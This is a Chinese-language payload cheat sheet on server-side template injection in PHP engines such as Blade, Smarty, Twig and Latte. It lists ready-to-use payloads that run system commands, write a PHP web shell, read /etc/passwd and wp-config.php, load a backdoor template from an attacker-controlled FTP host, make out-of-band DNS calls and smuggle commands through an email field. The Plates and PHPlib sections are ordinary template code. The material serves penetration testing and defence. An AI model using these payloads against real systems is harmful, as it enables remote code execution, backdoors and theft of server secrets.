[原文文档](PHP.en.md)

# 服务器端模板注入 - PHP

> 服务器端模板注入（SSTI）是一种漏洞，发生在攻击者可以将恶意输入注入服务器端模板中，导致模板引擎在服务器上执行任意命令。在PHP中，当用户输入嵌入在由模板引擎（如Smarty、Twig）呈现的模板中，甚至在普通PHP模板中，而没有适当的清理或验证时，就会出现SSTI。

## 概述

- [模板库](#模板库)
- [Smarty](#smarty)
- [Twig](#twig)
    - [Twig - 基本注入](#twig---基本注入)
    - [Twig - 模板格式](#twig---模板格式)
    - [Twig - 任意文件读取](#twig---任意文件读取)
    - [Twig - 代码执行](#twig---代码执行)
- [Latte](#latte)
    - [Latte - 基本注入](#latte---基本注入)
    - [Latte - 代码执行](#latte---代码执行)
- [patTemplate](#pattemplate)
- [PHPlib](#phplib和html_template_phplib)
- [Plates](#plates)
- [参考资料](#参考资料)

## 模板库

| 模板名称   | 负载格式 |
| --------------- | --------- |
| Blade (Laravel) | `{{ }}`   |
| Latte           | `{var $X=""}{$X}`   |
| Mustache        | `{{ }}`   |
| Plates          | `<?= ?>`  |
| Smarty          | `{ }`     |
| Twig            | `{{ }}`   |

## Blade

[官方网站](https://laravel.com/docs/master/blade)
> Blade是包含在Laravel中的简单而强大的模板引擎。

字符串`id`通过`{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}`生成。

```php
{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
```

---

## Smarty

[官方网站](https://www.smarty.net/docs/en/)
> Smarty是PHP的模板引擎。

```php
{$smarty.version}
{php}echo `id`;{/php} //在smarty v3中已弃用
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} //兼容v3
{system('cat index.php')} //兼容v3
```

---

## Twig

[官方网站](https://twig.symfony.com/)
> Twig是PHP的现代模板引擎。

### Twig - 基本注入

```php
{{7*7}}
{{7*'7'}} 将导致49
{{dump(app)}}
{{dump(_context)}}
{{app.request.server.all|join(',')}}
```

### Twig - 模板格式

```php
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```

### Twig - 任意文件读取

```php
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```

### Twig - 代码执行

```php
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id',1]|sort('system')|join}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id']|filter('passthru')}}
{{['id']|map('passthru')}}
{{['nslookup oastify.com']|filter('system')}}
```

注入值以避免对文件名使用引号的示例（通过OFFSET和LENGTH指定负载FILENAME的位置）

```python
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
```

通过FILTER_VALIDATE_EMAIL PHP的电子邮件示例。

```powershell
POST /subscribe?0=cat+/etc/passwd HTTP/1.1
email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

---

## Latte

### Latte - 基本注入

```php
{var $X="POC"}{$X}
```

### Latte - 代码执行

```php
{php system('nslookup oastify.com')}
```

---

## patTemplate

> [patTemplate](https://github.com/wernerwa/pat-template) 非编译的PHP模板引擎，使用XML标签将文档划分为不同部分

```xml
<patTemplate:tmpl name="page">
  This is the main page.
  <patTemplate:tmpl name="foo">
    It contains another template.
  </patTemplate:tmpl>
  <patTemplate:tmpl name="hello">
    Hello {NAME}.<br/>
  </patTemplate:tmpl>
</patTemplate:tmpl>
```

---

## PHPlib和HTML_Template_PHPLIB

[HTML_Template_PHPLIB](https://github.com/pear/HTML_Template_PHPLIB)与PHPlib相同，但移植到Pear。

`authors.tpl`

```html
<html>
 <head><title>{PAGE_TITLE}</title></head>
 <body>
  <table>
   <caption>Authors</caption>
   <thead>
    <tr><th>Name</th><th>Email</th></tr>
   </thead>
   <tfoot>
    <tr><td colspan="2">{NUM_AUTHORS}</td></tr>
   </tfoot>
   <tbody>
<!-- BEGIN authorline -->
    <tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
   </tbody>
  </table>
 </body>
</html>
```

`authors.php`

```php
<?php
//我们想显示这个作者列表
$authors = array(
    'Christian Weiske'  => 'cweiske@php.net',
    'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//创建模板对象
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//加载文件
$t->setFile('authors', 'authors.tpl');
//设置块
$t->setBlock('authors', 'authorline', 'authorline_ref');

//设置一些变量
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//显示作者
foreach ($authors as $name => $email) {
    $t->setVar('AUTHOR_NAME', $name);
    $t->setVar('AUTHOR_EMAIL', $email);
    $t->parse('authorline_ref', 'authorline', true);
}

//完成并输出
echo $t->finish($t->parse('OUT', 'authors'));
?>
```

---

## Plates

Plates受Twig启发，但是原生PHP模板引擎而不是编译模板引擎。

控制器：

```php
//创建新的Plates实例
$templates = new League\Plates\Engine('/path/to/templates');

//渲染模板
echo $templates->render('profile', ['name' => 'Jonathan']);
```

页面模板：

```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```

布局模板：

```php
<html>
  <head>
    <title><?=$this->e($title)?></title>
  </head>
  <body>
    <?=$this->section('content')?>
  </body>
</html>
```

## 参考资料

- [局限性只是幻觉 – 在各处通过RCE进行高级服务器端模板利用 - YesWeHack - 2025年3月24日](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
- [通过Twig转义处理程序的服务器端模板注入（SSTI） - 2024年3月21日](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)